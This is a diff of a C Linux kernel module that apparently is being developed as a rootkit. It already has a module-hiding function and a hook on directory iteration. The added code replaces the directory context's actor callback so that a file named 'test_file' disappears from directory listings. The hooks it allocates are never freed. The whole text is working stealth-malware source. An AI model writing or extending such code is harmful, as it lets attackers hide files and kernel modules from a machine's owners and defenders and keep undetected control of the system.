@@ -15,6 +15,7 @@ static struct list_head *modules;
 
 // TODO: Provide a way for the module to control the path(s).
 static const char *test_path_name = "/home/yanayg";
+static const char *test_file_name = "test_file";
 static int (*iterate_shared) (struct file *, struct dir_context *);
 
 static void hide_module(void) {
@@ -51,9 +52,40 @@ static int get_inode_by_path_name(const char *path_name, struct inode **inode) {
     return 0;
 }
 
+struct dir_context_hook {
+    struct list_head head;
+    struct dir_context *ctx;
+    filldir_t prev_actor;
+};
+
+static LIST_HEAD(dir_context_hooks);
+
+static int new_actor(struct dir_context *ctx, const char *name, int namelen, loff_t off, u64 ino, unsigned type) {
+    struct list_head *pos;
+    struct dir_context_hook *entry;
+
+	list_for_each(pos, &dir_context_hooks) {
+	    entry = list_entry(pos, struct dir_context_hook, head);
+	    if (entry->ctx == ctx) {
+	    	printk(KERN_INFO "Called hooked actor! %s", name);
+	    	if (!strcmp(name, test_file_name)) {
+	    	    return 0;
+	    	}
+	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
+	    }
+	}
+	return -1;
+}
+
 static int new_iterate_shared(struct file *filp, struct dir_context *dir_context) {
     int res;
+    struct dir_context_hook *hook;
 	printk(KERN_INFO "Called hooked iterate!");
+	hook = (struct dir_context_hook *)kmalloc(sizeof(struct dir_context_hook), GFP_KERNEL);
+	hook->ctx = dir_context;
+	hook->prev_actor = dir_context->actor;
+	list_add(&hook->head, &dir_context_hooks);
+	dir_context->actor = new_actor;
 	res = iterate_shared(filp, dir_context);
 	if (res) {
 	    return res;
